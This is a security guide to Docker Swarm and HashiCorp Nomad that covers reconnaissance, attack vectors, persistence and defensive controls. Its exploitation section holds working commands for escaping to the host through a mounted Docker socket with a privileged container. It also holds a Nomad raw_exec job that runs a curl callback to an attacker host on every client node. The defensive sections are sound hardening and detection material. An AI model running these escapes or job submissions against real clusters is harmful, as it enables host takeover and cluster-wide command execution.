# Docker Swarm and Nomad Security

Kubernetes dominates orchestration, but Docker Swarm and HashiCorp Nomad
are widely deployed in smaller clusters, on the edge, and in HashiCorp
shops. Both are simpler than Kubernetes, and that simplicity changes the
attack surface: fewer components, but each one carries more implicit
trust.

Swarm is built into Docker Engine. A manager node is a Raft peer, and the
gossip protocol distributes node state. Nomad uses its own Raft cluster,
with a separate Consul integration for service discovery. In both cases,
the control plane is the highest-value target, and the node agent is the
path to the host.

## 1. Overview

Docker Swarm has two node roles:

- **Manager** - participates in the Raft consensus, holds the cluster
  state, and schedules services. The manager API is the Docker Engine API
  with swarm endpoints enabled.
- **Worker** - runs tasks. Talks to managers over the swarm control plane.

Nomad has an analogous split:

- **Server** - Raft peer, holds the job state, exposes the HTTP API on
  port 4646.
- **Client** - runs allocations. Nomad clients can run raw executables,
  Docker containers, and other task drivers, which is a wider execution
  surface than Swarm workers.

Both platforms expose a management API that is effectively root on the
cluster if unauthenticated.

## 2. Reconnaissance / Enumeration

Swarm indicators:

- `docker info` shows `Swarm: active` and lists manager nodes.
- The Docker Engine socket is present at `/var/run/docker.sock`.
- Port 2377 (manager), 7946 (gossip TCP/UDP), 4789 (VXLAN).

Nomad indicators:

- HTTP API on port 4646; `GET /v1/agent/self` returns agent configuration.
- Port 4647 (client RPC), 4648 (server RPC).
- A `nomad` binary in the PATH or a `nomad.hcl` configuration file.

From inside a Swarm task, a mounted `/var/run/docker.sock` is the
highest-value discovery: it grants full Docker API access, which on a
manager node means cluster control.

## 3. Common Attack Vectors

Swarm:

- **Exposed Docker socket** - a container with `/var/run/docker.sock`
  mounted can create privileged containers and reach the host.
- **Open manager API** - Docker Engine API on 2375/2376 with no TLS
  client verification gives cluster-admin equivalent access.
- **Gossip spoofing** - an attacker on the gossip network can inject
  false node information.
- **Raft snapshot leakage** - the manager state contains secrets and
  service definitions.

Nomad:

- **Unauthenticated HTTP API** - the Nomad API has no auth by default;
  ACLs must be enabled explicitly.
- **Job submission** - a client with `submit-job` capability can run
  arbitrary commands on any client node.
- **Consul integration** - weak Consul ACLs expose service metadata and
  can lead to service impersonation.
- **Raw exec driver** - Nomad can run raw binaries, not just containers,
  widening the escape surface.

## 4. Exploitation Recipes

Swarm: a container with the Docker socket mounted is a direct path to
host control.

```bash
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run --privileged -v /:/host \
  -it alpine chroot /host
```

Expected output (trimmed):

```text
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS   NAMES
a1b2c3d4e5f6   web:1.0   "node"    2h ago    Up 2h             web.1
```

Nomad: submit a job that runs on every client.

```hcl
job "attacker" {
  type = "system"
  task "shell" {
    driver = "raw_exec"
    config {
      command = "/bin/sh"
      args    = ["-c", "curl http://attacker/callback"]
    }
  }
}
```

```bash
nomad job run attacker.hcl
```

If ACLs are disabled, the submission succeeds and the task runs on every
client node.

## 5. Post-Exploitation

Swarm persistence:

- Create a service that mounts the Docker socket and restarts on failure.
- Add a new manager node controlled by the attacker (requires a manager
  join token).
- Replace an existing service image with an attacker-controlled image.

Nomad persistence:

- Create a periodic job that re-runs the payload every hour.
- Register a new Nomad client with a spoofed identity.
- Modify the Consul service catalog to redirect traffic to an attacker
  endpoint.

In both cases the next step is the node filesystem, then the cloud
identity attached to the node.

## 6. Risk Context (Offensive)

The blast radius of a Swarm or Nomad compromise is the union of every
service and task the cluster runs, plus the node identities. Because both
platforms are often used on smaller clusters with weaker monitoring, a
compromise may stay unnoticed longer than on a large Kubernetes cluster.

Realistic attack paths:

- Container -> Docker socket -> manager API -> host.
- Unauthenticated Nomad API -> raw exec job -> every client.
- Weak Consul ACL -> service impersonation -> traffic capture.

## 7. Root Causes (Defensive)

- The Docker socket is mounted into containers because it is convenient.
- Nomad ACLs are left disabled because "it is an internal network".
- Swarm manager API is exposed without TLS client verification.
- Raft snapshots are stored on disk without encryption.
- Consul is deployed with default (permissive) ACLs.

## 8. Preventive Controls (Defensive)

Swarm:

- Never mount `/var/run/docker.sock` into a container that does not need
  it; use a socket proxy with a narrow API allowlist.
- Require TLS on the Docker API, with client certificate verification.
- Rotate the manager join token and limit manager node exposure.
- Encrypt Raft data at rest.

Nomad:

- Enable ACLs and require a token for every API call.
- Restrict the raw_exec driver or disable it on clients that do not need
  it.
- Use Consul ACLs with least privilege.
- Bind the Nomad HTTP API to a private interface, or front it with an
  authenticating proxy.

## 9. Detection Controls (Defensive)

- Alert on `docker run --privileged` and `docker run -v /:/host` on
  manager nodes.
- Detect new Swarm services that mount the Docker socket.
- Alert on Nomad job submissions from unexpected tokens or IPs.
- Monitor Consul for service registrations that change routing.
- Watch for Raft snapshot reads from unexpected processes.

## 10. Verification (Defensive)

- Confirm no running container has `/var/run/docker.sock` mounted unless
  it is an explicit socket proxy.
- Confirm the Docker API on managers rejects requests without a valid
  client certificate.
- Confirm Nomad ACLs are enabled and a request without a token returns
  403.
- Confirm raw_exec is disabled unless a specific job requires it.
- Confirm Consul denies service registration without an ACL token.

## Certification Alignment

- **Docker Certified Associate** - Swarm orchestration, security, node
  management.
- **HashiCorp Certified: Nomad Associate** - job specification, ACLs,
  cluster operations.
- **HashiCorp Certified: Consul Associate** - service discovery, ACLs,
  intentions.

## References

- Docker Swarm mode overview - https://docs.docker.com/engine/swarm/
- Docker Engine security - https://docs.docker.com/engine/security/
- Nomad ACL system - https://developer.hashicorp.com/nomad/docs/other-specifications/acl-policy
- Nomad raw_exec driver - https://developer.hashicorp.com/nomad/docs/drivers/raw_exec
- Consul ACLs - https://developer.hashicorp.com/consul/docs/security/acl